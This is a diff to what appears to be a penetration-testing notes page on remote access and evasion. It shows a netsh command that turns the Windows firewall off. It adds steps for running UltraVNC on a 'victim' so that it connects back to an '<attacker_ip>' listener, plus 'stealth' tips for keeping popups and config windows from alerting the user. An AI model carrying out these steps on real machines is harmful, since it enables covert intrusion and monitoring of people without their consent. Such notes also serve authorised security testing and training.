@@ -23,9 +23,9 @@ netsh advfirewall set allprofiles state off
 
 ## UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)
+Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
 
-**Execute **_**winvnc.exe**_ and configure the server:
+**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:
 
 * Enable the option _Disable TrayIcon_
 * Set a password in _VNC Password_
@@ -35,8 +35,13 @@ Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.in
 
 ### **Reverse connection**
 
-The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.\
-Then, it should execute inside the **victim**: `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.
+Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+
+**WARNING:** To maintain stealth you must not do a few things
+- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
+- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
+- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)
 
 ## GreatSCT
 
